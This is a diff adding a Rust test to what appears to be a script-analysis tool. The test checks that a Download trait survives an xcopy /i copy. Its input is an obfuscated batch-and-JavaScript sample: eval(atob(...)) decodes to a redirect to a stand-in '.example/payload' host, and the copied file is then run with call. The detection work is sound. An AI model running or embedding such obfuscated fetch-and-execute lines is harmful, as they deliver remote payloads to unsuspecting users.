@@ -13426,6 +13426,28 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn xcopy_i_directory_hint_without_trailing_slash_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veGNvcHktaS1kaXItaGludC5leGFtcGxlL3BheWxvYWQn")) > original.js
+xcopy /y /i original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://xcopy-i-dir-hint.example/payload"
+                )
+            }),
+            "xcopy /i directory hint did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copy_explicit_source_path_does_not_use_unrelated_basename_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29weS13cm9uZy1iYXNlbmFtZS5leGFtcGxlL3BheWxvYWQn")) > D:\Other\original.js
